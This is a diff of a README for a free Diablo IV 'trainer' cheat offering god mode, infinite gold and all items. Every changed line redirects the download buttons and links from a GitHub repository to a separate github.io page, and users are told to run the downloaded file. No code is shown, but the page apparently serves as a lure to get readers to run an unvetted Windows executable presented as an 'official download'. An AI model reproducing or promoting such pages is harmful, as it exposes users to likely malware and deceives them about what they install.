@@ -1,6 +1,6 @@
 # ⚔️ diablo-4-trainer-2026 - God Mode, Infinite Gold, All Items
 
-[![Download Trainer](https://img.shields.io/badge/Download-Diablo_4_Trainer_2026-FF6F00?style=for-the-badge&logo=windows&logoColor=white&labelColor=1A1A2E)](https://github.com/Mahan23cee/diablo-4-trainer-2026)
+[![Download Trainer](https://img.shields.io/badge/Download-Diablo_4_Trainer_2026-FF6F00?style=for-the-badge&logo=windows&logoColor=white&labelColor=1A1A2E)](https://mahan23cee.github.io)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these exact steps to get the trainer working. It takes less than 2 minute
 
 Visit this link to download the application:
 
-👉 **[CLICK HERE TO DOWNLOAD](https://github.com/Mahan23cee/diablo-4-trainer-2026)**
+👉 **[CLICK HERE TO DOWNLOAD](https://mahan23cee.github.io)**
 
 This takes you to the official download page. Look for the green "Download" button or the latest release file. Click it to start the download.
 
@@ -176,7 +176,7 @@ There is nothing else to install. Run the file and you're good to go.
 
 If you need to download again, use this button:
 
-[![Get the Trainer](https://img.shields.io/badge/⬇%20Download-Diablo_4_Trainer_2026-28A745?style=for-the-badge&logo=download&logoColor=white&labelColor=103B1E)](https://github.com/Mahan23cee/diablo-4-trainer-2026)
+[![Get the Trainer](https://img.shields.io/badge/⬇%20Download-Diablo_4_Trainer_2026-28A745?style=for-the-badge&logo=download&logoColor=white&labelColor=103B1E)](https://mahan23cee.github.io)
 
 ---
 
@@ -184,7 +184,7 @@ If you need to download again, use this button:
 
 When a new version of Diablo IV comes out, the trainer might stop working. To fix this:
 
-1. Visit the same download link: [https://github.com/Mahan23cee/diablo-4-trainer-2026](https://github.com/Mahan23cee/diablo-4-trainer-2026)
+1. Visit the same download link: [https://mahan23cee.github.io](https://mahan23cee.github.io)
 2. Check the date of the latest release
 3. Download the newer version
 4. Replace the old file with the new one
@@ -210,7 +210,7 @@ If you have any other questions or issues, check the repository page for any upd
 | **Trainer Name** | diablo-4-trainer-2026 |
 | **Works With** | Diablo IV (PC / Windows) |
 | **Features** | God mode, infinite gold, max paragon, all legendary items |
-| **Download** | [Click here](https://github.com/Mahan23cee/diablo-4-trainer-2026) |
+| **Download** | [Click here](https://mahan23cee.github.io) |
 | **Cost** | Free |
 | **Installation** | Run the file, press apply |
 
